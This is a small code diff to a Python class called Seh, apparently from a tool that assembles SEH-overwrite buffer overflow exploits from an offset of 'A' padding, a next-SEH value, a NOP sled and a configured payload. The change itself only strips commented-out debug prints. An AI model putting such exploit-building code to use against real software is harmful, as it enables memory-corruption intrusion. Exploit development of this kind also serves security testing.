@@ -40,17 +40,10 @@ class Seh:
 
     def stack_fit(self):
 
-        # print("[+] Filling stack at " + str(offset))
-
         if (sys.version_info >= (3, 0)):
             _offset = ("A" * self.config.offset).encode('latin-1')
         else:
             _offset = ("A" * self.config.offset)
-
-        # print(_offset)
-
-        # if (self.config.offset):
-        #     _offset = "A" * self.config.offset
 
         if (self.config.skip_seh != ""):
             _nextseh = self.str_encode(self.config.skip_seh)
@@ -69,9 +62,9 @@ class Seh:
             print(_nops)
             print(type(self.str_encode("\x90" * self.config.nops)))
 
-        # print("-" * 50)
-        # print(self.config.payload)
-        # print("-" * 50)
+            # print("-" * 50)
+            # print(self.config.payload)
+            # print("-" * 50)
 
         if(self.config.payload != ""):
             _esp = self.config.payload
